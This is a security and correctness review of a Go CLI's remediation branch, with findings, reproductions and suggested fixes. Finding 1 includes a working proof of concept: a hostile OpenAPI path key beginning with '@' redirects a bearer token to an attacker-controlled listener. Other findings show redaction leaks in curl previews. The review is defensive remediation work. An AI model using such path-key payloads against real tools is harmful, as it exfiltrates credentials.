# Review — `phase-2a-remediation` vs `main`

Four reviewers (security, spec-compliance, concurrency, integration) over the full branch diff
(85 files, +11957/-1925). `go build`, `go vet`, `gofmt -l .` and `go test -race ./...` are all
green with finding 1 live — the standing warning in CLAUDE.md holds for a second cycle.

Branch is mid-flight: `tasks.json` tasks 1–16 are complete, 17–24 not started. Findings below
are defects in what has landed; finding 12 records the remaining scope so it is not mistaken
for one.

## Finding 1: A spec path key moves the URL authority past the host check
- **Reviewer:** security, integration (independently, both wire-verified)
- **Severity:** CRIT
- **Blocked-by:** none
- **Repeat-of:** cycle 1 finding 1
- **File:** internal/request/build.go:409
- **Description:** `binder.credentials` asks the host set exactly one question —
  `allowed := b.in.Hosts.Allows(req.BaseURL)` — but the URL curl receives is assembled later
  from two fields: `full := r.BaseURL + r.Path` (`internal/request/request.go:320`, reaching
  curl at `internal/curl/config.go:153`). `binder.path` (`build.go:215`) escapes path
  *parameter values* but never constrains the operation's own path template; its only check is
  for a leftover `{`/`}`. Nothing requires the path to begin with `/`. An OpenAPI `paths:` key
  beginning with `@` therefore turns the allowed host into userinfo, and a key beginning with
  `.` extends it into a domain the attacker owns.

  Wire-verified end to end with two capture listeners. Spec: `servers: [{url:
  http://127.0.0.1:18081}]`, `bearerAuth`, path key `"@127.0.0.1:18082/steal"`. No
  `--base-url`, no `--allow-host`:

  ```
  $ TALARIA_AUTH_BEARER=CANARY-SUPER-SECRET talaria call hostile.yaml steal --output json
  {"schema":"talaria/v1","dry_run":false,"request":{
   "curl":"curl -q -s -H \"Authorization: Bearer $TALARIA_AUTH_BEARER\" 'http://127.0.0.1:18081@127.0.0.1:18082/steal'",...}}
                                              ← exit 0, no credentials_withheld, no stderr line
  attacker listener (18082): PATH /steal  Host: 127.0.0.1:18082
                             Authorization: Bearer CANARY-SUPER-SECRET
  allowed listener  (18081): (nothing)
  ```

  This breaks DESIGN.md:360 verbatim: *"a resolved credential is transmitted only to a host the
  spec declares, or one a human has explicitly allowed."* The spec is untrusted input by the
  project's own doctrine. `auth check` under the same flags reports `withheld: false` and is
  equally wrong, because `destinationWithholds` (`cmd/talaria/auth.go:121`) asks
  `request.Destination`, which is also base-URL-only — so the pre-flight and the call agree and
  both are wrong. The `--dry-run` curl carries `$TALARIA_AUTH_BEARER` beside the attacker URL,
  so the "portable reproduction" leaks it a second way.

  The branch already contains the correct form of the check one file over: `history replay`
  asks `hosts.Allows(entry.URL)` against the *whole* URL (`cmd/talaria/history_replay.go:159`)
  and refuses the identical entry with exit 2. The store refuses to replay a request `call`
  happily makes.
- **Suggested fix:** ask `HostSet.Allows` the same string the executor will use — build the
  effective URL (`req.URL(request.Symbolic)` or a `BaseURL + Path` join) and check that, not
  `req.BaseURL`. `request.Destination` / `destinationWithholds` need the same treatment in the
  same commit or `auth check` drifts from `call` again. Secondarily, reject in `binder.path` an
  operation path that does not begin with `/` or that carries `@ ? #` or a control character
  before the first `/` — the same argument that produced `authorityChars`
  (`internal/request/server.go:225`) applies to path keys. Do both: the first closes the class,
  the second closes it at the point a hostile spec becomes exit 2 rather than a request.

  **What the previous fix missed:** the `HostSet` / `Withheld` / `warnWithheld` /
  `credentials_withheld` machinery is all correct and works. It was anchored to the wrong
  string. The phase doc's acceptance criterion ("point `--base-url` at a capture listener")
  named only the flag route, so `cmd/talaria/call_test.go:262` exercises the flag route only
  and no fixture ever had a hostile path key. The regression test must be a spec whose `paths:`
  key does not start with `/`, asserted with `assertNoCanaryOnTheWire`.

## Finding 2: A `--body` literal prints unredacted in `request.curl` while `request.body` beside it is redacted
- **Reviewer:** security
- **Severity:** CRIT
- **Blocked-by:** none
- **Repeat-of:** cycle 1 finding 6
- **File:** internal/curl/render.go:168
- **Description:** `callPayload` builds two views of the same bytes from the same `*Request`
  and redacts only one:

  ```go
  Curl:    curl.Render(req),                            // cmd/talaria/call.go:427
  ...
  view.Request.Body = string(red.Body(req.Body.Data))   // cmd/talaria/call.go:434
  ```

  `curl.Render` → `bodyArgs` → `bodyDirective`, whose `BodyArgv` branch is
  `return "--data-raw", string(body.Data)` — raw bytes, no redactor anywhere on the path.
  `red.Body` is `secret.ResponseRedactor.Body`, covering `access_token`, `refresh_token`,
  `id_token` (`internal/secret/response.go:17`) plus the user's `redact.body-paths`.

  ```
  $ talaria call spec.yaml login --allow-mutations --dry-run --output json \
      --body '{"access_token":"SUPERSECRET"}'
  {"request":{
   "curl":"curl -q -s -X POST ... --data-raw '{\"access_token\":\"SUPERSECRET\"}' ...",
   "body":"{\"access_token\":\"\\u003credacted\\u003e\"}"}}
  ```

  One JSON object, two contradictory answers about the same field. The pretty renderer prints
  the curl row too, so this is not `--output json` only. History redacts it
  (`corpus.Redactors.requestBody`), so the most-guarded artefact is clean and stdout — which §3
  principle 0 puts first — is not. It breaks DESIGN.md:418's leak-channel row: *"Emitted/dry-run
  curl commands | Always symbolic … Runnable where the env var exists; useless to exfiltrate."*
  A curl line carrying a live `access_token` is not safe to paste into a bug report, which is
  the field's stated purpose. A `redact.body-paths:` entry a user configures for exactly this
  reason is honoured on one surface and silently ignored on the other.
- **Suggested fix:** redact the `BodyArgv` value before inlining it — either thread the
  `*secret.ResponseRedactor` into `curl.Render` (it currently takes only `*Request`, so this is
  a signature change), or have `callPayload` render the curl from a `*Request` whose
  `Body.Data` has been through `red.Body`. Do **not** suppress the body entirely:
  `TestThePreviewedCommandSendsWhatTheCallSends` depends on the argv body being present, and
  the redacted form keeps the command shape.

  **What the previous fix missed:** it added `red.Body` to `view.Request.Body` — CLAUDE.md's
  rule "`callPayload` passes `view.Request.Body` through `redactors.Response.Body`" documents
  exactly this — and did not touch the sibling field in the same struct literal. The canary
  gate has the hole in the same shape: `TestABodyFileSecretReachesNoOutputSurface`
  (`internal/canary/canary_test.go:1142`) passes only because `--body @file` takes the
  *referenced* branch of `bodyDirective`. There is no `--body '<literal>'` counterpart; adding
  one turns the suite red today.

## Finding 3: `document.b`'s abandoned backing arrays keep the resolved credential readable
- **Reviewer:** concurrency, security, spec-compliance (all three, independently)
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** cycle 1 finding 29
- **File:** internal/curl/config.go:366
- **Description:** `directive` grows the buffer with `d.b = append(d.b, …)`. Each time `append`
  outgrows capacity it allocates a **new** array, copies, and abandons the old one untouched.
  `discard()` (`internal/curl/firewall.go:82`) clears `d.b[:cap(d.b)]` — the *current* array
  only. `document.auth` runs second (right after `url`) and ~ten further directives follow it,
  so the array holding the credential is reallocated away several times before the build ends.

  Verified with a scratch test against the real `document.build` path (bearer scheme,
  `TALARIA_AUTH_BEARER` set). After both `cleanup()` and `doc.discard()` had run, an abandoned
  array read back:

  ```
  url = "https://api.example.com/pets"
  request = "GET"
  header = "Authorization: Bearer CANARY-tok-0123456789abcdef"
  ```

  Final geometry on a minimal request is `len=284 cap=416` — at least five reallocations, each
  leaving one uncleared copy on the heap. This is structurally the defect finding 29 described
  (`Builder.Reset` "drops the array without touching the bytes"), reproduced by a different
  mechanism after the container type changed.

  The test cannot see it: `owned(d)` (`internal/curl/firewall_test.go:63`) returns
  `d.b[:cap(d.b)]`, which can only ever reach the surviving array. `firewall.go:78`'s comment —
  "leaves … nothing a resolved credential could still be read out of" — is therefore false, and
  CLAUDE.md now records the property as an invariant, which is precisely what the
  "never write a comment asserting a property no test enforces" rule forbids.
- **Suggested fix:** give `document` an explicit `grow(n int)`: when `cap(d.b)-len(d.b) < n`,
  allocate, `copy`, then `clear(old[:cap(old)])` before dropping the reference; route
  `directive`/`flag` through it. Then extend `owned()` (or add a sibling assertion) to hold a
  reference to a pre-seeded small array across the build — that is what made the defect
  visible. If the complete claim is judged not worth the refactor, the honest alternative is to
  narrow the comment in `firewall.go:78` and in CLAUDE.md to what is actually enforced, since
  `os.Getenv`'s own string is unscrubbable regardless.

## Finding 4: `document.cookies` accumulates a resolved credential into a `strings.Builder`
- **Reviewer:** concurrency
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** cycle 1 finding 29
- **File:** internal/curl/config.go:266
- **Description:** CLAUDE.md, written on this branch: *"Never introduce another accumulator for
  credential-bearing text without the same property."* `cookies` is one, in the same file the
  finding-29 fix rewrote, and it was left alone. `resolve(c.Value)` returns the real credential
  and it goes into `var b strings.Builder`; `b.String()` (`config.go:283`) aliases the
  builder's array into an immutable string that can never be zeroed, and neither the array nor
  the string is reached by `discard()` or `cleanupWith`. This is the exact aliasing property
  the finding-29 commit message says it removed.

  Reachable, not hypothetical: `config.schemeReason` (`internal/config/auth.go:360`) treats
  `apiKey` in `InCookie` as supported, and `binder.credentials`
  (`internal/request/build.go:428`) appends it to `req.Cookies` as a `Secret` pair. Any spec
  with `type: apiKey, in: cookie` routes its resolved key through this builder.
- **Suggested fix:** write the joined cookie value into `d.b` incrementally (`cookie = "` …
  `"`), or into a `[]byte` with the same grow/clear discipline finding 3's fix establishes.
  Add the cookie scheme to `TestBuildConfigCleanupZeroesTheDocument` — it exercises bearer only.

## Finding 5: The boundary guard has no entry for `corpus → config`, the rule this branch wrote down
- **Reviewer:** spec-compliance, integration
- **Severity:** WARN
- **Blocked-by:** design
- **Repeat-of:** cycle 1 finding 30 (second half — "fix the import *and* the guard")
- **File:** internal/e2e/boundary_test.go:56
- **Description:** CLAUDE.md:281, added on this branch in `6c5f702`: *"`internal/corpus` may not
  import `internal/config`: the store has to stay usable by the twin, which has no profiles."*
  `internal/corpus/entry.go:13` states the same as accomplished fact: *"The package
  deliberately does not import internal/config."* The `boundaries` table's `corpus` entry
  forbids `executorAndTwin` only (= `curl`, `twin`), and the test reads dependencies
  **transitively** by design — its own comment says *"an indirect edge violates a rule just as
  completely as a direct import."* The edge exists today:

  ```
  $ go list -deps ./internal/corpus | grep talaria
  … internal/operation  internal/secret  internal/config  internal/request  internal/corpus
  ```

  `corpus` → `request` (`entry.go:24`, `replay.go:11`) → `config` (`build.go:11`,
  `server.go:12`). Adding `"internal/config"` to that entry fails the suite immediately. This
  is the identical shape the table's comment warns about — *"a package with no entry is not
  checked, which is how `corpus → curl` survived being written down"* — reproduced in the same
  commit that wrote the warning. The `corpus → curl` half did land correctly; the guard was
  made one rule narrower than the prose beside it.

  The `request → config` edge itself pre-dates the branch. What is new is the rule and the
  guard that was supposed to cover it.
- **Suggested fix:** DESIGN.md does not state whether the twin constraint is about *direct*
  imports or the whole dependency closure, and the two readings lead to different work: a fix
  must choose between (Y1) qualifying the rule to "may not import `internal/config` **directly**"
  and giving the table an entry a direct-import check enforces, or (Y2) breaking the transitive
  edge — `replay.go` needs only `request.Userinfo` and `request.IsHTTPScheme`, both pure string
  helpers that could move to `internal/operation`, the one package `config`, `request` and
  `corpus` may all import. Whichever is chosen, CLAUDE.md:281 and `entry.go:13` must be made to
  say it. Task 22 is the natural home.

## Finding 6: The retention cap permits a store the read bound refuses, and the state is unrecoverable
- **Reviewer:** concurrency, integration
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none (new on this branch, introduced by the finding-13 fix)
- **File:** internal/corpus/file.go:37
- **Description:** `readStore`'s comment justifies the 64 MiB refusal with *"a file that size
  has stopped being the store `trim` maintains."* That is arithmetically false. `trim` caps by
  **entry count per source** (`maxPerSource = 1000`, `file.go:25`, two sources), not by bytes,
  and one entry may carry a request body and a response body of `MaxBody` (64 KiB) each,
  base64 costing a third more — ~175 KB per line, comfortably under `maxEntryBytes` (256 KiB).
  The store `trim` maintains therefore tops out near 350 MB, ~5× `maxStoreBytes`. talaria can
  write itself into a store it will not read, using nothing but its own retention policy.

  Verified: **384 entries** — one source at 38% of its own cap — produce a 67,174,505-byte
  store, at which point simultaneously:

  - `Store.Read()` fails, so `history`, `history show` and `history replay` are all dead.
  - `trim(path)` fails the same way, so the only thing that can shrink the file can never run.
  - `storedIDs` (`store.go:148`) collapses every read error to `nil`, so the taken-id set is
    empty and `uniqueID` loses the collision check `store.go:120` exists to provide.
  - `Append` calls `write` *before* `trim` (`store.go:110`), so each later call appends —
    growing the file further — then returns the error, and `recordCall` prints
    `warning: the call was not recorded in history` for an entry that **is** on disk with its
    response. Verified against the shipped binary: `file before=71610000 after=71610448`.

  The last bullet is finding 23's exact failure — an operator re-runs a mutating call believing
  nothing was recorded — reached through the new size bound rather than through a full disk.
  Findings 23, 24 and 31 belong to task 19, which has not started; the point here is that the
  finding-13 fix made their trigger routine and their state absorbing. Only a manual `rm` gets
  out.
- **Suggested fix:** make the two bounds consistent — either derive `maxStoreBytes` from
  `maxPerSource × maxEntryBytes × len(sources)`, or have `trim` fall back to a streaming tail
  rewrite that does not require the whole file, so a store crossing the bound is repairable by
  the process that created it. Whichever, write the relationship between the numbers down
  beside them. Fold task 19's finding-23 fix (`Append` must not report failure for a line it
  wrote) and finding-24 fix (`storedIDs` must distinguish `fs.ErrNotExist` from unreadable)
  into the same change.

## Finding 7: A profile's own `base-url` is not in the allowed host set, so the documented profile workflow withholds its own credential
- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** design
- **Repeat-of:** cycle 1 finding 1
- **File:** cmd/talaria/hosts.go:23
- **Description:** DESIGN.md §5a lists exactly three sources for the allowed set: spec
  `servers[]`, `--allow-host`, profile `allow_hosts`. `allowedHosts` implements exactly that —
  `request.NewHostSet(request.ServerURLs(doc), flags, profileHosts)` — and never adds
  `prof.BaseURL`. But §4's precedence makes the profile's `base-url` the destination, so a
  profile naming a base URL *and* a credential resolves the credential and then withholds it.

  Reproduced against README.md:205's own example, verbatim:

  ```
  $ talaria call spec.yaml getPet --param petId=42 --profile staging --dry-run --output json
  warning: credentials withheld from staging.example.com:443 (bearerAuth): the spec does not
  declare that host; pass --allow-host staging.example.com:443 to send them
  {… "credentials_withheld":[{"scheme":"bearerAuth","reason":"host not in spec servers[]",
   "host":"staging.example.com:443"}]}
  ```

  README.md:205–216 introduces the block with *"For more than one environment,
  `~/.config/talaria/config.yaml` holds named profiles"* and shows `base-url:
  https://staging.example.com` beside `auth: bearerAuth: ${STAGING_TOKEN}` and an
  `allow_hosts:` list that does not contain the base URL's host. Following the documentation
  produces a call with no credential, and nothing in README or AGENT.md says a profile must
  repeat its own host under `allow_hosts`. `auth check --profile staging` agrees
  (`"present":true,"withheld":true`), so the two commands are consistent — the defect is that
  the headline profile workflow is non-functional as shipped and as documented. No test covers
  a profile with a `base-url`; `TestCallDeliversCredentialsToAnAllowedHost` uses `--allow-host`
  only.
- **Suggested fix:** DESIGN.md §5a states the three sources but never says whether an
  explicitly selected profile's own `base-url` counts as "a host a human explicitly allowed"; a
  fix must choose between (Y1) adding `prof.BaseURL`'s host to the set in `allowedHosts` — the
  profile is human-authored, mode-0600 and explicitly selected, the same reasoning
  `config.Profile.ReferencesEnv` already relies on — and (Y2) leaving the set as specified and
  correcting README.md:205 and AGENT.md so the example carries its own host in `allow_hosts`
  and the text says it is required. Amend §5a with whichever is chosen, then add the missing
  profile-with-base-url test.

## Finding 8: The remote spec fetch is a blocking wait the signal context does not reach
- **Reviewer:** concurrency
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/spec/source.go:137
- **Description:** CLAUDE.md's rule is that the context *"has to arrive wherever this process
  waits on something it does not control."* A remote spec fetch is exactly that, and it is the
  last such wait with none: `Loader.fetch` uses `client.Get(url)`, not
  `http.NewRequestWithContext`, and `Load`/`loadURL`/`fetch` take no `ctx`. `loadSpec`
  (`cmd/talaria/list.go:178`) has `cmd` in hand and could pass `cmd.Context()` in one line.

  Sequence: `talaria call --spec https://slow.example/openapi.json getPet` against a server
  that accepts the connection and stalls. `loadSpec` runs first in `call`'s `RunE`, before the
  binder, before curl. SIGINT or SIGTERM cancels the context; nothing is listening; the process
  sits for the full `fetchTimeout` (30 s). Under systemd or a CI runner that is 30 s of
  ignoring SIGTERM per invocation. Bounded rather than a true hang, and the second Ctrl-C now
  kills thanks to `signalContext` — but the first signal is silently ineffective in a function
  this branch otherwise rewrote (task 10 added `checkRedirect` and the size bound to it).
  Finding 14 enumerated three blocking calls (stdin, flock, preflight) and did not list this one.
- **Suggested fix:** `fetch(ctx, url)` with `http.NewRequestWithContext`, threaded from
  `Loader.Load(ctx, ref)` and `loadSpec`'s `cmd.Context()`. Report the cancellation as
  `clierr.RequestFailed` (exit 1), not `clierr.SpecLoad`, per the rule in CLAUDE.md.

## Finding 9: `auth check`'s `withheld` field is in the output contract and in no shipped document
- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** cmd/talaria/auth.go:38
- **Description:** `authScheme.Withheld` adds `"withheld":true` to every `auth check` entry
  whose credential a call under the same flags would not send. It is the machine-readable half
  of DESIGN.md §5a's *"`auth check` reports against the resolved host set, so 'present' never
  means 'will actually be sent'."* No shipped document names it: `grep -n withheld AGENT.md
  README.md docs/design/DESIGN.md` returns only prose about `call`'s `credentials_withheld`.
  AGENT.md:134–140 — the operating manual DESIGN.md §3.7 calls a first-class deliverable, and
  the only `auth check` reference an agent has — still shows
  `{"scheme":"bearerAuth","source":"env:TALARIA_AUTH_BEARER","present":true}` and says
  *"`present` is a lookup."* An agent reading that sees `present:true` and has no way to learn
  the credential will not be sent, which is exactly the confusion §5a's sentence exists to
  prevent.
- **Suggested fix:** add the field to AGENT.md's `auth check` block, to README.md:279's `auth
  check` section, and to DESIGN.md §4's `auth check` example, in the same style the `supported`
  field got.

## Finding 10: DESIGN.md §3.4 still specifies `--data @file`; the code emits `--data-binary`
- **Reviewer:** spec-compliance
- **Severity:** INFO
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** docs/design/DESIGN.md:162
- **Description:** DESIGN.md §3.4: *"`--body @file` emits `--data @file` and `--body -` emits
  `--data @-`."* `bodyDirective` (`internal/curl/render.go:161`) emits `--data-binary @path` /
  `--data-binary @-`. The reason is sound and recorded in CLAUDE.md (`--data` strips newlines
  out of a file) and `TestThePreviewedCommandSendsWhatTheCallSends` depends on it — but the
  spec, which the phase doc names the source of truth, was not amended, and DESIGN.md v0.5
  lists this exact rule among "three rules the phase-2 design settled".
- **Suggested fix:** one-line amendment to DESIGN.md §3.4 naming `--data-binary` and why.

## Finding 11: `TestSIGINTEndsACallWaitingOnStdin` orders its signal with a sleep
- **Reviewer:** concurrency
- **Severity:** INFO
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** cmd/talaria/root_test.go:202
- **Description:** `time.Sleep(500 * time.Millisecond)` then `child.Process.Signal(os.Interrupt)`.
  `run` calls `curl.SweepStale()` — an `os.ReadDir` over `TMPDIR` plus `os.RemoveAll` calls —
  *before* `signalContext()` installs the handler. On a loaded machine or a large/network
  `TMPDIR` the signal can land in the pre-handler window; the child dies by default disposition
  and `assertExitedWith` fails with `child was killed by SIGINT, want it to exit 1` — precisely
  the message a genuine "the context does not reach the stdin read" regression produces. The
  sibling test `TestASecondSignalTerminatesTheProcess` already has the right shape: the child
  prints `ready` and the parent waits for it.
- **Suggested fix:** have the `"run"` branch of `TestMain` emit a readiness marker on stderr
  once the handler is installed and `awaitLine` on it instead of sleeping. Failing that, move
  `SweepStale()` below `signalContext()` in `run` — the sweep is not something a signal needs
  to interrupt, but it should not precede the handler either.

## Finding 12: Remaining in-scope work (not a defect — recorded so it is not mistaken for one)
- **Reviewer:** spec-compliance, integration
- **Severity:** INFO
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** tasks.json:1
- **Description:** Tasks 17–24 have not started; the branch's last commit is task 16. Confirmed
  still defective in the tree, as expected:
  - **17** — `internal/corpus/lock_unix.go:36` is byte-identical to `main`: `LOCK_EX`, no
    deadline, no context. It now composes badly with the finding-14 fix, since `recordCall`
    (`cmd/talaria/record.go:53`) runs *after* `curl.ExecuteWith` returns including on the
    cancellation path, so Ctrl-C during a call cancels the exec and then walks into a blocking
    `flock(2)` that `SA_RESTART` makes uninterruptible.
  - **23, 24, 31** — `corpus/store.go:114` still `return trim(path)`; `store.go:148`
    `storedIDs` still collapses every error to `nil`; `cmd/talaria/history.go:43`
    `TimingMS int64,omitempty` drops a real 0 ms observation while its own comment claims the
    opposite (`internal/curl/exec.go:162` rounds a sub-0.5 ms local call to 0; the stored
    `EntryResponse.TimingMS` correctly has no `omitempty`, so the data is lost only in the list
    view). See finding 6 for how the size bound made 23 and 24 routine.
  - **25** — no TTL, no conditional GET, no `--refresh` (`grep -rn refresh --include=*.go`
    finds only `refresh_token`); `internal/spec/source.go:103` serves the cache forever, and
    reads it back through an unbounded `os.ReadFile` that finding 9's bound does not cover.
    This is a live doc-vs-code contradiction: DESIGN.md §4:235–239 states the 24 h TTL,
    ETag/Last-Modified revalidation and `--refresh` as settled policy.
  - **16** — `Append` still makes two full scans under the lock.
  - **22** — the sweep for comments asserting unenforced invariants has not run. Findings 3, 5
    and the `timing_ms` comment above are three instances it should catch.
  - **23 (task)** — the end-to-end firewall test.

  Ordering constraints held: 11 before 1, findings 1/2/3/22 in one commit (`8cf9d1a`), 21 with
  4 (`19a3633`). Scope discipline held: nothing touches `internal/boundary`,
  `internal/fileguard`, `talaria doctor`, exit code 6, packaging or `internal/twin`; nothing
  reintroduces `run`/`internal/gen`/JUnit; no new exit code was added to `internal/clierr`;
  findings 27, 28 and 32 were left alone.
- **Suggested fix:** none — continue the task list.

## Verified sound (recorded so the next cycle does not re-derive it)

- `HostSet` matching: userinfo stripped by `u.Hostname()`, case folded both sides, default port
  normalised so `:443` and the bare form are one key, IPv6 bracketed consistently, trailing dot
  and punycode deliberately not folded (narrower, never wider), `%`/`*`/`\`/`@` refused in human
  entries, zero `HostSet` fails closed, `Key()` and `Allows()` agree on every URL `absoluteBase`
  admits.
- Server-variable substitution: `authorityChars` + `hasControl` block authority movement; `%2f`
  makes `url.Parse` fail in `encodeHost` mode so the server is dropped — narrower, not wider.
  Single left-to-right sweep terminates on a self-referential default.
- `auth check` vs `call` exit codes traced cell by cell: unsupported+absent → 5 both sides,
  unsupported+brought-token → 0 both sides, undeclared → 2 both sides. The command layer only
  calls `Covers`/`Resolve`/`Unsatisfied`.
- `call` → history → `history show` → `history replay` round trip is byte-identical on the wire,
  including a path param needing escaping (`a/b` → `/pets/a%2Fb`), with the stored
  `Authorization` dropped and re-resolved.
- `newRedactors` built once per `RunE` in both commands and threaded into binder, view and store.
- `bodyContentType` is the single seam; `isMediaType` is strictly stricter than `checkSplit`, so
  the binder-less replay path cannot reach a different verdict.
- `escapeCell` on both renderers, rows and headers; `fitSummaries` measures with
  `output.CellWidth` and the tab-laden fixture renders at exactly the 100-character budget.
- `preflightCache` is guarded by `preflightMu` on both accesses and caches only a verdict the
  binary produced; `-race` is clean across all 14 packages. Both `exec.CommandContext` sites
  have context, `WaitDelay = killGrace` and `isolate`; neither inherits the terminal's stdin.
- `signalContext`'s goroutine exits on every path; `stdinBody`'s channel is buffered so its
  reader cannot block after the ctx branch wins; cancellation routes through `b.stop` →
  `clierr.RequestFailed`.
- `basicPair` is the only writer of the `user` directive; the `user@host` base-URL prompt vector
  is closed independently by `absoluteBase`'s `Userinfo` check.
- `Entry.Replay` drops redaction markers and built-in credential names, routes declared names to
  `Params`, and hands the body over as `Inputs.Stdin` so an `@`/`-` prefix cannot choose a file
  read. `Body.Bytes` checks encoded length before the decode and decoded length after.
- File modes 0700/0600 explicitly `Chmod`'d on the history file, trim temp, body temp, capture
  dir and spec cache. No credential-shaped strings in the diff or in `testdata/`.
- `.ralph/stack.json`'s three command fields are byte-identical to `ci.yml`'s `run:` lines. The
  only `TALARIA_TEST_*` env var is `signalChildEnv`, branched in `TestMain`, absent from the
  shipped binary.

## Build and test output

```
$ go build ./...        (no output, exit 0)
$ go vet ./...          (no output, exit 0)
$ gofmt -l .            (no output)
$ go test -race ./...   ok — all 14 packages
```

Green, with findings 1 and 2 live. The standing warning in CLAUDE.md holds for a second cycle.
